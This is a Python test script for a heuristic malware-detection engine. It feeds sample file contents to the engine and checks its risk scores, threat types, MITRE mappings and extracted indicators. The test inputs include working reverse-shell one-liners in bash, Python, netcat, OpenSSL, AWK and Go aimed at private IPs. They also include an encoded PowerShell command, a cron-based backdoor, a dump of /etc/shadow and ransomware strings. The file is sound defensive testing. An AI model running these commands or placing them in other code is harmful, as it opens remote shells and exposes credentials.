"""Tests for the heuristic threat engine, including structured output fields."""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from core.llm_analyzer import _fallback_analysis

# ═══════════════════════════════════════════════════════════
#  Test Cases
# ═══════════════════════════════════════════════════════════

tests = [
    ("OpenSSL reverse shell (user test case)", "test.txt", "modified",
     "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.1.253:9000 > /tmp/s; rm /tmp/s"),

    ("Python reverse shell", "test.txt", "modified",
     "import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('10.0.0.1',4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(['/bin/sh','-i'])"),

    ("Bash reverse shell", "notes.txt", "modified",
     "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"),

    ("PowerShell encoded cmd", "update.txt", "new",
     "powershell -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"),

    ("Normal text file", "readme.txt", "modified",
     "Hello, this is just a normal note file with nothing suspicious."),

    ("Netcat shell", "deploy.txt", "new",
     "nc -e /bin/sh 192.168.1.100 4444"),

    ("Crontab persistence", "backup.sh", "new",
     "crontab -e\n*/5 * * * * /tmp/.hidden_backdoor"),

    ("Password file access", "audit.log", "modified",
     "cat /etc/shadow > /tmp/hashes.txt"),

    (".exe file created", "updater.exe", "new",
     "MZ binary content here"),

    ("Ransomware indicators", "encrypt.py", "new",
     "from Crypto.Cipher import AES\nransom_note = 'YOUR FILES HAVE BEEN ENCRYPTED'\nbitcoin_wallet = 'bc1q...'"),

    ("Mkfifo + netcat combo", "payload.sh", "new",
     "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"),

    ("Bash 196 reverse shell", "script.sh", "modified",
     "0<&196;exec 196<>/dev/tcp/10.10.10.10/4444; sh <&196 >&196 2>&196"),

    ("AWK reverse shell", "cron.txt", "new",
     "awk 'BEGIN {s = \"/inet/tcp/0/10.0.0.1/4242\"; while(42) { do{ printf \"shell> \" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"),

    ("Golang reverse shell", "main.go", "new",
     "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"10.0.0.1:4444\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go"),
]


# ═══════════════════════════════════════════════════════════
#  Run tests and validate structure
# ═══════════════════════════════════════════════════════════

print("=" * 80)
print("HEURISTIC ENGINE TESTS -- Structured Output Validation")
print("=" * 80)

ALL_PASS = True

for label, path, change, content in tests:
    r = _fallback_analysis(path, change, content)

    # -- Display --
    flag = "!!" if r['risk_score'] >= 7 else "  "
    print(f"\n{flag} [{r['priority'].upper():8s}] Score={r['risk_score']:2d}  "
          f"Malicious={str(r['is_malicious']):5s}  {label}")
    print(f"   Threat Type : {r.get('threat_type', 'MISSING')}")
    print(f"   Classification: {r.get('threat_classification', 'MISSING')[:80]}")
    print(f"   MITRE ATT&CK : {r.get('mitre_attack', 'MISSING')}")
    print(f"   IOCs         : {r.get('iocs', 'MISSING')}")
    print(f"   Confidence   : {r.get('confidence', 'MISSING')}")
    print(f"   Source       : {r.get('analysis_source', 'MISSING')}")
    print(f"   -> {r['reasoning'][:120]}")

    # -- Structural assertions --
    required_fields = ['risk_score', 'priority', 'is_malicious', 'reasoning',
                       'threat_type', 'threat_classification', 'mitre_attack',
                       'iocs', 'confidence', 'analysis_source', 'findings']
    for field in required_fields:
        if field not in r:
            print(f"   *** FAIL: Missing field '{field}'")
            ALL_PASS = False


# ═══════════════════════════════════════════════════════════
#  Specific assertion tests
# ═══════════════════════════════════════════════════════════

print("\n" + "=" * 80)
print("SPECIFIC ASSERTIONS")
print("=" * 80)

# Test 1: OpenSSL reverse shell must be critical
r = _fallback_analysis("test.txt", "modified",
    "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.1.253:9000 > /tmp/s; rm /tmp/s")
assert r['risk_score'] >= 9, f"OpenSSL rev shell score too low: {r['risk_score']}"
assert r['priority'] == 'critical', f"OpenSSL rev shell not critical: {r['priority']}"
assert r['is_malicious'] == True, "OpenSSL rev shell not flagged malicious"
assert r['threat_type'] == 'reverse_shell', f"Wrong threat_type: {r['threat_type']}"
assert 'T1059.004' in r['mitre_attack'], f"Missing MITRE technique T1059.004: {r['mitre_attack']}"
assert len(r['iocs']) > 0, f"No IOCs extracted: {r['iocs']}"
assert '192.168.1.253:9000' in r['iocs'] or '192.168.1.253' in r['iocs'], f"IP not in IOCs: {r['iocs']}"
assert r['analysis_source'] == 'heuristic'
print("[PASS] OpenSSL reverse shell: CRITICAL, malicious, reverse_shell, MITRE mapped, IOCs extracted")

# Test 2: Normal text must be benign
r = _fallback_analysis("readme.txt", "modified",
    "Hello, this is just a normal note file with nothing suspicious.")
assert r['risk_score'] <= 3, f"Normal text score too high: {r['risk_score']}"
assert r['is_malicious'] == False, "Normal text flagged malicious"
print("[PASS] Normal text file: benign, low score")

# Test 3: Python reverse shell must be critical
r = _fallback_analysis("test.py", "modified",
    "import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('10.0.0.1',4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(['/bin/sh','-i'])")
assert r['risk_score'] >= 8, f"Python rev shell score too low: {r['risk_score']}"
assert r['is_malicious'] == True, "Python rev shell not flagged malicious"
assert r['threat_type'] == 'reverse_shell', f"Wrong threat_type: {r['threat_type']}"
assert len(r['mitre_attack']) > 0, "No MITRE techniques for Python rev shell"
print("[PASS] Python reverse shell: CRITICAL, malicious, reverse_shell, MITRE mapped")

# Test 4: Ransomware must be detected
r = _fallback_analysis("encrypt.py", "new",
    "from Crypto.Cipher import AES\nransom_note = 'YOUR FILES HAVE BEEN ENCRYPTED'\nbitcoin_wallet = 'bc1q...'")
assert r['risk_score'] >= 8, f"Ransomware score too low: {r['risk_score']}"
assert r['threat_type'] == 'ransomware', f"Wrong threat_type: {r['threat_type']}"
print("[PASS] Ransomware indicators: detected with correct threat_type")

print("\n" + "=" * 80)
print(f"ALL STRUCTURAL ASSERTIONS: {'PASS' if ALL_PASS else 'FAIL'}")
print("ALL SPECIFIC ASSERTIONS: PASS")
print("=" * 80)

